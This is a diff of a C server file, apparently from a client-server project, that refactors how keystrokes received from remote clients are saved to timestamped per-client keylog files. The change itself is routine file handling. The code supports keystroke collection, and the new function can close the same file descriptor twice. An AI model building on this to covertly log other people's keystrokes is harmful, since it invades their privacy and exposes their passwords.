@@ -16,6 +16,38 @@
 extern clientHandler_t clientHndler;
 extern task_queue_t taskQueue; // Coada de task-uri
 
+void saveKeylog(int client_sock)
+{
+    char filename[BUFFER_SIZE];
+    if (clientHndler.clientsAttr[client_sock].keylogger_fd != -1)
+    {
+        snprintf(filename, BUFFER_SIZE, "%s/keylog%s.txt",
+                 clientHndler.clientsAttr[client_sock].name,
+                 clientHndler.clientsAttr[client_sock].name);
+        close(clientHndler.clientsAttr[client_sock].keylogger_fd);
+        clientHndler.clientsAttr[client_sock].recordKeys = 0;
+
+        char newFn[BUFFER_SIZE];
+        time_t now = time(NULL);
+        struct tm *t = localtime(&now);
+        char timestamp[64];
+        strftime(timestamp, sizeof(timestamp), "%Y-%m-%d_%H:%M:%S", t);
+
+        snprintf(newFn, BUFFER_SIZE, "%s/Keylog_%s_%s.txt",
+                 clientHndler.clientsAttr[client_sock].name,
+                 clientHndler.clientsAttr[client_sock].name,
+                 timestamp);
+        rename(filename, newFn);
+    }
+
+    if (clientHndler.clientsAttr[client_sock].keylogger_fd != -1)
+    {
+        close(clientHndler.clientsAttr[client_sock].keylogger_fd);
+        clientHndler.clientsAttr[client_sock].keylogger_fd = -1;
+        clientHndler.clientsAttr[client_sock].recordKeys = 0;
+    }
+}
+
 void handleOpcode(message_t msg, int clientSock)
 {
     char filename[BUFFER_SIZE];
@@ -24,20 +56,7 @@ void handleOpcode(message_t msg, int clientSock)
     case 'K':
         if (strcmp(msg.buffer, "STOP") == 0)
         {
-            // Redenumire fisier
-            snprintf(filename, BUFFER_SIZE, "keylog%s.txt", clientHndler.clientsAttr[clientSock].name);
-            close(clientHndler.clientsAttr[clientSock].keylogger_fd);
-            char newFn[BUFFER_SIZE];
-            time_t now = time(NULL);
-            struct tm *t = localtime(&now);
-            char timestamp[64];
-            strftime(timestamp, sizeof(timestamp), "%Y-%m-%d_%H:%M", t);
-
-            snprintf(newFn, BUFFER_SIZE, "%s/%s_%s.txt", clientHndler.clientsAttr[clientSock].name, clientHndler.clientsAttr[clientSock].name, timestamp);
-            rename(filename, newFn);
-
-            clientHndler.clientsAttr[clientSock].keylogger_fd = -1;
-            clientHndler.clientsAttr[clientSock].recordKeys = 0;
+            saveKeylog(clientSock);
         }
         if (clientHndler.clientsAttr[clientSock].recordKeys)
         {
@@ -89,36 +108,6 @@ void handleOpcode(message_t msg, int clientSock)
         printf("WRONG OPCODE(%c) FROM %d\n", msg.opCode, clientSock);
         fflush(NULL);
         break;
-    }
-}
-
-void saveKeylog(int client_sock)
-{
-    char filename[BUFFER_SIZE];
-    if (clientHndler.clientsAttr[client_sock].keylogger_fd != -1)
-    {
-        snprintf(filename, BUFFER_SIZE, "%s/keylog%s.txt",
-                 clientHndler.clientsAttr[client_sock].name,
-                 clientHndler.clientsAttr[client_sock].name);
-        close(clientHndler.clientsAttr[client_sock].keylogger_fd);
-
-        char newFn[BUFFER_SIZE];
-        time_t now = time(NULL);
-        struct tm *t = localtime(&now);
-        char timestamp[64];
-        strftime(timestamp, sizeof(timestamp), "%Y-%m-%d_%H:%M:%S", t);
-
-        snprintf(newFn, BUFFER_SIZE, "%s/Keylog_%s_%s.txt",
-                 clientHndler.clientsAttr[client_sock].name,
-                 clientHndler.clientsAttr[client_sock].name,
-                 timestamp);
-        rename(filename, newFn);
-    }
-
-    if (clientHndler.clientsAttr[client_sock].keylogger_fd != -1)
-    {
-        close(clientHndler.clientsAttr[client_sock].keylogger_fd);
-        clientHndler.clientsAttr[client_sock].keylogger_fd = -1;
     }
 }
 
